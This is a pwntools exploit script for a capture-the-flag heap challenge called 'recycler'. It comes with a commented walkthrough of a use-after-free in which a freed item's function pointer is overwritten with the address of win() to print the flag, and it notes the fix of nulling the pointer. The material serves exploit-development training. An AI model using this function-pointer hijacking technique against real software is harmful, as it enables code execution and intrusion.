#!/usr/bin/env python3
from pwn import *

#
# Exploitation strategy:
#
# This binary contains a classic Use-After-Free (UAF) vulnerability.
#
# The exploitation steps are similar to the `00_account_vault` challenge.
# 
# The program maintains an array of 10 items, each containing a function pointer (`action`) and a 24-byte data buffer, for a total size of 32 bytes.
#
# 1. Allocate an item at index 0.
#    - `item[0]->action` is initialized to `default_action`.
# 2. Free the item at index 0.
#    - The chunk is returned to the allocator (tcache), but the `item[0]` pointer is *NOT* set to NULL.
#    - Therefore, `item[0]` becomes a dangling pointer still referencing the freed chunk.
# 3. Allocate an item at index 0 again.
#    - Since the requested size is identical (32 bytes), glibc's tcache returns the previously freed chunk.
#    - As a result, `item[0]` now references the same heap chunk as before.
# 4. Write the address of `win()` into the payload buffer.
#    - The first 8 bytes of the chunk correspond to the `action` function pointer in the original item structure.
#    - Writing `p64(win)` overwrites `item[0]->action`.
# 5. Trigger "Execute Action" for index 0.
#    - The program performs:
#          item[0]->action(item[0]);
#      using the dangling pointer.
#    - Since `action` now points to `win`, execution is redirected to `win()` and the flag is printed.
# Root cause:
#   The program frees the item at index 0 but continues to use the stale pointer afterwards. A proper fix would be:
#       free(item[0]);
#       item[0] = NULL;    // remember that free() just marks the memory as available, it does NOT clear the pointer !!!
#   preventing further dereferences of freed memory.
#

context.binary = elf = ELF('./recycler', checksec=False)

p = remote("offsec.m0lecon.it", 13522)

win = elf.sym.win

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'index: ', b'0')  # send index 0 to allocate the first item in the array
p.sendlineafter(b'data: ', b'A'*24) # fill the data with 24 B to match the size of the 'data' buffer

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'index: ', b'0')   # send index 0 to free the first item in the array

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'index: ', b'0')   # send index 0 to allocate the first item in the array again, which will reuse the same memory location as before
p.sendlineafter(b'payload: ', p64(win).ljust(32, b'X'))   # overwrite the 'action' function pointer of the allocated item with the address of 'win'

p.sendlineafter(b'> ', b'4')
p.sendlineafter(b'index: ', b'0')   # send index 0 to trigger the 'action' function pointer of the allocated item, which now points to 'win'


print(p.recvall(timeout=2).decode(errors='replace'))
